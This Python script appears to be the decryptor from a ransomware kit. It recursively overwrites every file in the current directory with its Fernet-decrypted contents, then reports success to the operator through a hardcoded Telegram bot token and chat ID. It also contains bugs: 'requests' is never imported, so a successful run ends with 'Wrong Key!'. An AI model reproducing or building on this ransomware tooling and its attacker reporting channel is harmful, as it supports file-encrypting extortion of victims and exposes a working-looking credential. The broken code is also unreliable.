#!/usr/bin/env python3

import os, sys
try:
 from cryptography.fernet import Fernet
except:
 os.system("pip3 install cryptography")

BOT_TOKEN = "5565135113:AAEhhOjl9gEZVDFtcYi5XNkk3th8Uix0KpA"
files = []
nadecrypt = False

for file in os.listdir():
 if file == sys.argv[0]:
  continue
 files.append(file)

#print(files)

key = input("Decryption Key: ")
def loopme(file,key):
 global nadecrypt
 try:
  if os.path.isfile(file):
   #print(file)
   try:
    with open(file,"rb") as fcontent:
     fcontentf = fcontent.read()
    decrypted = Fernet(key).decrypt(fcontentf)
    with open(file,"wb") as filewrite:
     filewrite.write(decrypted)
    nadecrypt = True
   except TypeError:
    pass
  elif os.path.isdir(file):
   for dirr in os.listdir(file):
    absolute_path = os.path.abspath(file+"/"+dirr)
    loopme(absolute_path,key)
    #print(absolute_path)
  else:
   pass
 except:
  pass
for file in files:
 loopme(file,key)


try:
 if nadecrypt:
  print("Successfully recovered all files")
  r = requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",json={"chat_id": 1862839947,
        "text" : "Decrypted successfully!",
        "parseMode" : "html"})
  nadecrypt = False
 else:
  print("Wrong Key!")
except:
 print("Wrong Key!")
